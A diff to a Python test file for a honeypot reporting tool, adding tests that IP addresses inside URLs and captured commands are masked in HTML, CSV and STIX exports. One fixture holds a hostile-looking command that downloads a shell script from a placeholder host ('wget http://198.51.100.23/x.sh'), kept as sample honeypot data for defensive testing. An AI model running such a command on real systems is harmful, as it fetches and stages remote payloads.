@@ -67,6 +67,15 @@ def test_mask_ips(filled):
     assert ".x" in html
     stix = exports.to_stix(filled, mask_ips=True)
     assert not any("ipv4-addr" in o.get("pattern", "") for o in stix["objects"])
+    # IPs inside URLs and commands must be masked too, not only source IPs
+    ipv4 = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
+    raw_ips = {ip for r in filled.ioc_urls for ip in ipv4.findall(r["url"])}
+    raw_ips |= {ip for r in filled.commands for ip in ipv4.findall(r["command"])}
+    csv_text = exports.to_csv(filled, mask_ips=True)
+    stix_text = exports.dumps(stix)
+    for ip in raw_ips:
+        assert ip.replace(".", "[.]") not in html and ip not in html
+        assert ip not in csv_text and ip not in stix_text
 
 
 def test_csv_injection_neutralised(filled):
@@ -181,3 +190,24 @@ def test_stix_masked_output_valid_with_stix2_library(filled):
     _stix_validator().validate(text)
     patterns = [o["pattern"] for o in json.loads(text)["objects"] if o["type"] == "indicator"]
     assert patterns and not any("ipv4-addr" in p or "ipv6-addr" in p for p in patterns)
+
+
+def test_mask_ips_covers_urls_commands_without_db():
+    from datetime import timedelta
+
+    from honeylens.reporting.data import ReportData, Window
+    end = datetime(2026, 10, 5, tzinfo=UTC)
+    d = ReportData(window=Window(end - timedelta(days=7), end), data_filter="all",
+                   commands=[{"command": "wget http://198.51.100.23/x.sh; ping 2001:db8::7", "times": 1,
+                              "sessions": 1, "mapped": True}],
+                   ioc_urls=[{"url": f"http://198.51.100.{n}/x.sh", "attempts": 1, "first_seen": end,
+                              "last_seen": end, "simulated": True} for n in (23, 24)])
+    html = render_html(d, mask_ips=True)
+    assert "198[.]51[.]100[.]23" not in html and "198[.]51[.]100[.]x" in html and "2001:db8::7" not in html
+    assert "198.51.100.23" not in exports.to_csv(d, mask_ips=True)
+    stix = exports.to_stix(d, mask_ips=True)
+    ids = [o["id"] for o in stix["objects"]]
+    assert len(ids) == len(set(ids)), "masked URLs that collide must not create duplicate STIX ids"
+    assert "198.51.100.23" not in exports.dumps(stix)
+    # without masking the report still shows the (defanged) address
+    assert "198[.]51[.]100[.]23" in render_html(d, mask_ips=False)
